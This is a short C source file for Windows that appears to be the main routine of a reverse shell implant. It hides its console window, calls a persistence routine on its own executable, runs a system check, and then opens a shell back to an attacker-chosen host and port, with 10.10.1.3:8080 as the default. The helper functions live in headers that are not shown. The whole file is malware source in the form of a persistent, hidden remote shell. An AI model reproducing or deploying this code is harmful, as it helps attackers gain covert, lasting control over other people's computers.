#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

#include "create_shell.h"
#include "persistence.h"
#include "system_check.h"


int main(int argc, char** argv) {
   
    
    
    
    FreeConsole();
    persist(argv[0]);
    
    syscheck();
    


    

    if (argc == 3) {
        int t1 = GetTickCount64();
        int port = atoi(argv[2]); //Converting port in Char datatype to Integer format
        CreateShell(argv[1], port, t1);
    }
    else {
        int t1 = GetTickCount64();
        char host[] = "10.10.1.3";
        int port = 8080;
        CreateShell(host, port, t1);
        
    }
    return 0;
}